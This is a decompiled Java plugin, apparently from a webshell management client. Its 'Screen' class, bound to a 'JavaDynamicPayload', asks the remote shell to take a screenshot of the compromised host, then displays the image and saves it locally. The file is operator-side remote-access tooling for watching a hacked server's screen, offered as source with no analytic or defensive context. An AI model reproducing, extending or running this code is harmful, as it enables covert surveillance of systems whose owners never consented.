/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.plugins.java;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.dialog.GFileChooser;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileOutputStream;
import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import util.Log;
import util.automaticBindClick;
import util.http.ReqParameter;

@PluginAnnotation(payloadName="JavaDynamicPayload", Name="Screen", DisplayName="\u5c4f\u5e55\u622a\u56fe")
public class Screen
implements Plugin {
    private final JPanel panel = new JPanel(new BorderLayout());
    private final JButton runButton = new JButton("screen");
    private final JSplitPane splitPane = new JSplitPane();
    private final JLabel label;
    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;

    public Screen() {
        this.splitPane.setOrientation(0);
        this.splitPane.setDividerSize(0);
        JPanel topPanel = new JPanel();
        topPanel.add(this.runButton);
        this.label = new JLabel(new ImageIcon());
        this.splitPane.setTopComponent(topPanel);
        this.splitPane.setBottomComponent(new JScrollPane(this.label));
        this.splitPane.addComponentListener(new ComponentAdapter(){

            @Override
            public void componentResized(ComponentEvent e) {
                Screen.this.splitPane.setDividerLocation(0.15);
            }
        });
        this.panel.add(this.splitPane);
    }

    private void runButtonClick(ActionEvent actionEvent) {
        byte[] result = this.payload.evalFunc(null, "screen", new ReqParameter());
        try {
            if (result.length < 100) {
                Log.error(this.encoding.Decoding(result));
            }
            GFileChooser chooser = new GFileChooser();
            chooser.setFileSelectionMode(0);
            boolean flag = 0 == chooser.showDialog(new JLabel(), "\u9009\u62e9");
            File selectdFile = chooser.getSelectedFile();
            if (flag && selectdFile != null) {
                FileOutputStream fileOutputStream = new FileOutputStream(selectdFile);
                fileOutputStream.write(result);
                fileOutputStream.close();
                GOptionPane.showMessageDialog(this.panel, String.format("save screen to -> %s", selectdFile.getAbsolutePath()), "\u63d0\u793a", 1);
            }
            this.label.setIcon(new ImageIcon(ImageIO.read(new ByteArrayInputStream(result))));
        } catch (Exception e) {
            Log.error(e);
        }
    }

    @Override
    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModule();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    @Override
    public JPanel getView() {
        return this.panel;
    }
}

